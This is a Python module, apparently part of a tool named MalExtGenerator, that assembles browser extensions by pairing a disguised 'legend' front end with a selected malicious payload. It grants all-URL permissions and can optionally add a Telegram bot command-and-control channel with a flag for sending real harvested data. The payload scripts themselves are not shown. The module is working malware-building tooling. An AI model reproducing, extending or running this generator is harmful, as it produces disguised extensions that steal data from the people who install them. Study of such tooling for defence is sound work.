import json
import os
import uuid
from datetime import datetime
from pathlib import Path

from .legend_engine import LegendEngine
from .payload_engine import PayloadEngine
from .template_engine import TemplateEngine
from ..utils.helpers import ensure_dir, safe_filename, format_timestamp
from ..utils.logger import logger


class MalExtGenerator:
    def __init__(self, output_dir: str | Path = "./output"):
        self.output_dir = ensure_dir(output_dir)
        self.legend_engine = LegendEngine()
        self.payload_engine = PayloadEngine()
        self.template_engine = TemplateEngine()

        logger.info(f"MalExtGenerator initialized. Output: {self.output_dir}")

    def generate(
        self,
        legend_id: str,
        payload_id: str,
        output_name: str | None = None,
        c2_bot_token: str | None = None,
        c2_chat_id: str | None = None,
        c2_enabled: bool = False,
        c2_send_real_data: bool = False,
    ) -> Path:
        if not self.legend_engine.exists(legend_id):
            raise ValueError(f"Неизвестная легенда: {legend_id}")
        if not self.payload_engine.exists(payload_id):
            raise ValueError(f"Неизвестный payload: {payload_id}")

        # ----- Данные -----
        legend = self.legend_engine.get(legend_id)
        payload = self.payload_engine.get(payload_id)

        legend_data = legend.get_legend()
        payload_data = payload.get_payload()

        if not output_name:
            timestamp = format_timestamp()
            output_name = f"{legend_id}_{payload_id}_{timestamp}"
        else:
            output_name = safe_filename(output_name)

        ext_dir = ensure_dir(self.output_dir / output_name)

        # ----- C2: сессия -----
        session_id = uuid.uuid4().hex[:12]

        logger.info(
            f"Generating extension: {legend_data.name} + {payload_data.name} "
            f"-> {ext_dir} (C2: {c2_enabled})"
        )
        all_permissions = list(set(
            legend_data.permissions + payload_data.permissions
        ))

        def is_host_pattern(perm: str) -> bool:
            if perm == "<all_urls>":
                return True
            if "://" in perm:
                return True
            if perm.startswith("*."):
                return True
            return False

        permissions = [
            p for p in all_permissions if not is_host_pattern(p)
        ]

        host_permissions = [
            p for p in all_permissions if is_host_pattern(p)
        ]

        if not host_permissions:
            host_permissions = ["<all_urls>"]

        if c2_enabled and c2_bot_token:
            if "https://api.telegram.org/*" not in host_permissions:
                host_permissions.append("https://api.telegram.org/*")

        logger.debug(f"[MANIFEST] permissions: {permissions}")
        logger.debug(f"[MANIFEST] host_permissions: {host_permissions}")

        context = {
            "legend": legend_data,
            "payload": payload_data,
            "permissions": permissions,
            "host_permissions": host_permissions,
            "popup_html": legend.get_popup_html(),
            "popup_css": legend.get_popup_css(),
            "payload_background_js": payload.get_background_js(),
            "payload_content_js": payload.get_content_js(),
            "payload_popup_js": payload.get_popup_js(),
            "generated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            # C2
            "c2_bot_token": c2_bot_token or "",
            "c2_chat_id": str(c2_chat_id) if c2_chat_id else "",
            "c2_session_id": session_id,
            "c2_enabled": "true" if (c2_enabled and c2_bot_token) else "false",
            "c2_send_real_data": "true" if c2_send_real_data else "false",
        }

        self._write_file(
            ext_dir / "manifest.json",
            self.template_engine.render("manifest.json.j2", **context),
        )
        self._write_file(
            ext_dir / "background.js",
            self.template_engine.render("background.js.j2", **context),
        )
        self._write_file(
            ext_dir / "content.js",
            self.template_engine.render("content.js.j2", **context),
        )
        self._write_file(
            ext_dir / "popup.html",
            self.template_engine.render("popup.html.j2", **context),
        )
        self._write_file(
            ext_dir / "popup.js",
            self.template_engine.render("popup.js.j2", **context),
        )
        self._write_file(
            ext_dir / "styles.css",
            self.template_engine.render("styles.css.j2", **context),
        )
        self._write_file(
            ext_dir / "README.md",
            self.template_engine.render("README.md.j2", **context),
        )
        self._write_file(
            ext_dir / "REPORT.md",
            self.template_engine.render("report.md.j2", **context),
        )

        self._write_file(
            ext_dir / "meta.json",
            json.dumps(
                {
                    "legend_id": legend_id,
                    "payload_id": payload_id,
                    "legend_name": legend_data.name,
                    "payload_name": payload_data.name,
                    "risk_level": payload_data.risk_level,
                    "permissions": permissions,
                    "host_permissions": host_permissions,
                    "generated_at": context["generated_at"],
                    "generator": "MalExtGenerator v1.0.0",
                    "c2": {
                        "enabled": c2_enabled and bool(c2_bot_token),
                        "session_id": session_id,
                        "bot_token": c2_bot_token or "",
                        "chat_id": str(c2_chat_id) if c2_chat_id else "",
                        "send_real_data": c2_send_real_data,
                    },
                },
                indent=2,
                ensure_ascii=False,
            ),
        )

        logger.info(f"Extension generated: {ext_dir}")
        return ext_dir


    def _write_file(self, path: Path, content: str) -> None:

        try:
            path.write_text(content, encoding="utf-8")
            logger.debug(f"Written: {path.name}")
        except Exception as e:
            logger.error(f"Failed to write {path}: {e}")
            raise

    def list_available(self) -> dict:
        return {
            "legends": self.legend_engine.list_all(),
            "payloads": self.payload_engine.list_all(),
        }


__all__ = ["MalExtGenerator"]
